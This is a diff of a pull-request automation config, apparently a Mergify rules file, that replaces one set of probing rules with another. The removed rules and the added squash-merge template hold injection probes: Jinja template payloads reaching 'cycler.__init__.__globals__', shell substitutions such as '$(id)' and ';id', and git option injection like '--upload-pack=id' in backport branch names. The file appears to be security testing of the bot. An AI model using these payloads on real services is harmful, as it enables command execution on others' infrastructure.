@@ -4,32 +4,13 @@ queue_rules:
       - base=main
 
 pull_request_rules:
-  - name: probe-comment
+  - name: probe-merge-template
     conditions:
-      - label=probe-comment
+      - label=probe-merge
     actions:
-      comment:
-        message: |
-          C1 arith={{ 7*7 }}
-          C2 ssti={{ cycler.__init__.__globals__ }}
-          C3 shell=$(id)
-          C4 title={{ title }} author={{ author }} number={{ number }} base={{ base }}
-  - name: probe-backport
-    conditions:
-      - label=probe-backport
-    actions:
-      backport:
-        branches:
-          - "--upload-pack=id"
-          - "$(id)"
-          - ";id"
-          - "--exec=id"
-          - "probe-target"
-  - name: probe-label
-    conditions:
-      - label=probe-label
-    actions:
-      label:
-        add:
-          - "L1-$(id)"
-          - "L2-arith"
+      merge:
+        method: squash
+        commit_message_template: |
+          {{ title }}
+          arith={{ 7*7 }}
+          ssti={{ cycler.__init__.__globals__ }}
